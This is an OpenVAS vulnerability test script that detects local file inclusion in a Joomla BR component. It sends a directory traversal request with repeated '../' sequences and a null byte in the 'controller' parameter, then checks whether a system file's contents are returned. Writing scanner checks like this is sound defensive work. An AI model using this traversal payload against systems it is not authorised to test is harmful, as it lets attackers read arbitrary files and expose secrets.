##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_com_br_lfi_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# Joomla BR Component Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to perform
directory traversal attacks and read arbitrary files on the affected
application.

Impact Level: Application";

tag_affected = "Joomla BR Component";

tag_insight = "The flaw is due to an input validation error in 'controller'
parameter to 'index.php', which allows attackers to read arbitrary files via
a ../(dot dot) sequences.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla BR component and is prone to local
file inclusion vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802572");
  script_version("$Revision: 9352 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-01-23 16:56:59 +0530 (Mon, 23 Jan 2012)");
  script_name("Joomla BR Component Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108948/joomlabr-lfi.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get the port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get the application directory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(joomlaDir, "/index.php?option=com_br&controller=",
                crap(data:"../",length:3*15),files[file],"%00");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:joomlaPort, url:url, pattern:file))
  {
    security_message(joomlaPort);
    exit(0);
  }
}
